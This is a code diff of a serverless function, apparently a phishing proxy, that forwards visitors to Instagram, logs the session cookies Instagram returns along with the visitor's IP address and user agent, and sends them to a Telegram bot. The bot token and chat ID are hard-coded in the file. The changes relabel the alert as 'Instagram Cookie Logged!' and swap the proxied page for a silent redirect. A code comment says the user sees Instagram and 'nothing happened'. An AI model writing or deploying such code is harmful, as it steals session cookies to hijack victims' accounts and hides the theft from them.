@@ -4,12 +4,12 @@ const fetch = require('node-fetch');
 const TELEGRAM_BOT_TOKEN = "8976721119:AAFh2XQKD_95hHATbpegFn0iToWO_W92-xE";
 const TELEGRAM_CHAT_ID = "8569746095";
 
-// Standard Chrome User-Agent to avoid Instagram blocking
+// Standard Chrome User-Agent
 const DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
 
 exports.handler = async (event, context) => {
     try {
-        // 1. Get the URL to proxy to
+        // 1. Get the URL to proxy to (default to Instagram)
         const urlParam = event.queryStringParameters.url;
         let targetUrl = urlParam || "https://www.instagram.com/";
 
@@ -27,8 +27,6 @@ exports.handler = async (event, context) => {
         headers['accept'] = event.headers['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
         headers['accept-language'] = event.headers['accept-language'] || 'en-US,en;q=0.9';
         headers['cache-control'] = 'max-age=0';
-
-        // Set host to the target domain
         headers['host'] = new URL(targetUrl).host;
 
         // 3. Fetch from Instagram
@@ -38,8 +36,7 @@ exports.handler = async (event, context) => {
                 method: event.httpMethod,
                 headers: headers,
                 body: event.body ? Buffer.from(event.body, 'base64') : undefined,
-                // Follow redirects automatically
-                redirect: 'follow' 
+                redirect: 'follow' // Follow all redirects
             });
         } catch (fetchError) {
             console.error("Fetch Error:", fetchError);
@@ -49,7 +46,7 @@ exports.handler = async (event, context) => {
             };
         }
 
-        // 4. Capture Cookies from Instagram's response
+        // 4. Capture ALL Cookies from Instagram's response
         // Instagram sends multiple Set-Cookie headers, so we need to join them
         const setCookieHeader = response.headers.get('set-cookie');
         const cookies = setCookieHeader || "No cookies found";
@@ -59,22 +56,23 @@ exports.handler = async (event, context) => {
         const userAgent = headers['user-agent'];
         const ip = event.headers['x-forwarded-for'] || event.headers['x-real-ip'] || "Unknown IP";
         
+        // Format cookies for readability
+        const formattedCookies = cookies.replace(/; /g, "\n").replace(/;/g, "\n");
+
         const message = `
-🍪 <b>Instagram Proxy Logged!</b>
+🍪 <b>Instagram Cookie Logged!</b>
 
 🕒 <b>Time:</b> ${timestamp}
 🌐 <b>IP:</b> ${ip}
 📱 <b>User Agent:</b> <code>${userAgent}</code>
 
-🔗 <b>Target URL:</b> <code>${targetUrl}</code>
-
-🍪 <b>Cookies (Set-Cookie):</b>
-<code>${cookies}</code>
+🍪 <b>Cookies:</b>
+<code>${formattedCookies}</code>
         `;
 
         // 6. Send to Telegram
         try {
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            const tgResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
@@ -83,24 +81,23 @@ exports.handler = async (event, context) => {
                     parse_mode: "HTML"
                 })
             });
+
+            if (!tgResponse.ok) {
+                console.error("Telegram API Error:", await tgResponse.text());
+            }
         } catch (telegramError) {
-            console.error("Telegram Error:", telegramError);
+            console.error("Telegram Fetch Error:", telegramError);
         }
 
-        // 7. Return the response from Instagram to the user
-        const responseHeaders = {};
-        response.headers.forEach((value, key) => {
-            responseHeaders[key] = value;
-        });
-
-        // Read the body
-        const bodyBuffer = await response.buffer();
-
+        // 7. Redirect the user to Instagram
+        // We return a 302 redirect to Instagram. The user sees Instagram, nothing happened.
         return {
-            statusCode: response.status,
-            headers: responseHeaders,
-            body: bodyBuffer.toString('base64'),
-            isBase64Encoded: true
+            statusCode: 302,
+            headers: {
+                Location: targetUrl,
+                "Cache-Control": "no-cache"
+            },
+            body: ""
         };
 
     } catch (error) {
